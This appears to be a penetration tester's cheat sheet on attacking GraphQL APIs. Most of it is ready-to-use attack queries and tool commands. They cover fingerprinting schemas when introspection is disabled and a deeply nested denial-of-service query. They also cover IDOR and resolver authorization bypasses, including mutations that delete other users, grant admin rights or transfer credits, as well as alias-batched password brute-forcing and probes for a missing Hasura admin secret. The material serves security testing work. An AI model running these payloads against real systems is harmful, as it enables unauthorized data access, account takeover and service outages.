GraphQL Testing
GraphQL changes the attack surface in interesting ways. Instead of N endpoints you have one, but the authorization model is fragmented across individual resolvers. Devs forget to add auth checks to resolvers that "nobody would call directly." They're wrong.
Introspection When "Disabled"
Full introspection gets disabled in prod fairly often now. Doesn't matter. You can still fingerprint the schema.
Field suggestion oracle:
# GraphQL returns "Did you mean X?" when you query a field that almost exists
# This works even when introspection is disabled
{"query": "{ __typename utilizr { id } }"}
# Response: "Did you mean 'user'?"
 
# Tool: Clairvoyance automates this
python3 clairvoyance.py -u target.com/graphql -o schema.json
__type queries that slip through:
# Even when __schema is blocked, __type sometimes isn't
{ __type(name: "User") { fields { name type { name kind } } } }
{ __type(name: "Query") { fields { name args { name type { name } } } } }
Introspection via POST vs GET:
# Some WAFs only block introspection on one method
GET /graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D
 
# Or try content-type switching
Content-Type: application/graphql   (vs application/json)
GraphQL path variations:
/graphql
/graphiql
/api/graphql
/v1/graphql
/query
/gql
Query Depth / Complexity DoS
No query depth limits means you can nest until the server dies. This is easy to demonstrate, but check the scope rules before DoSing prod.
# Classic nested query DoS
{
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends { id name }
          }
        }
      }
    }
  }
}
 
# Check if there's a depth limit - if you get a 200 with data 5 levels deep, keep going
# PoC: show response time degradation across depth levels
Authorization Gaps in Resolvers
This is the highest-value bug class in GraphQL. The pattern: developer adds auth to Query.adminUsers but forgets that User.adminNotes (a nested field resolver) returns the same data.
# Direct query blocked:
{ adminUsers { id email } }  # 403
 
# But nested access works:
{ me { friends { adminNotes } } }  # 200 with data
{ post(id: "123") { author { role internalFlags } } }
IDOR via GraphQL:
# Basic - swap your ID for another
{ user(id: "victim_id") { email phone ssn } }
 
# Via object chaining
{ order(id: "not-your-order") { user { email paymentMethod { last4 } } } }
Mutation auth gaps:
# Mutations are resolvers too. Test all of them.
mutation { deleteUser(id: "other_user_id") { success } }
mutation { updateUser(id: "other_user_id", role: "admin") { id role } }
mutation { transferCredits(fromId: "victim", toId: "attacker", amount: 1000) { newBalance } }
Batching and Alias-Based Brute Force
GraphQL supports sending multiple operations in one request. Rate limits that count HTTP requests instead of operations are bypassable this way.
Alias batching (single HTTP request, N checks):
{
  a1: login(username: "admin", password: "password1") { token }
  a2: login(username: "admin", password: "password2") { token }
  a3: login(username: "admin", password: "password3") { token }
  # ... repeat 100 times
}
Array batching (some implementations support this):
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"}
]
Tool: BatchQL
python3 BatchQL.py -u target.com/graphql
Tooling
# InQL - Burp extension, generates queries from introspection, finds hidden endpoints
# GraphQL Voyager - visualize schema relationships
# Altair GraphQL Client - better than GraphiQL for manual testing
 
# gql-cli for quick introspection
gql-cli target.com/graphql --print-schema > schema.graphql
 
# graphw00f - fingerprint GraphQL implementation (Apollo, Hasura, etc.)
# Different implementations have different known vulns
python3 graphw00f.py -d -t target.com/graphql
Hasura-Specific
If the target runs Hasura, look for admin console exposure and the x-hasura-admin-secret header. Hasura's permission model is declarative - misconfigurations are common and you can often read full tables via the API.
# Check if admin console is exposed
target.com/console
target.com/hasura/console
 
# Test if admin secret check is missing
curl -H "x-hasura-admin-secret: " target.com/v1/graphql \
  -d '{"query":"{__schema{queryType{name}}}"}'
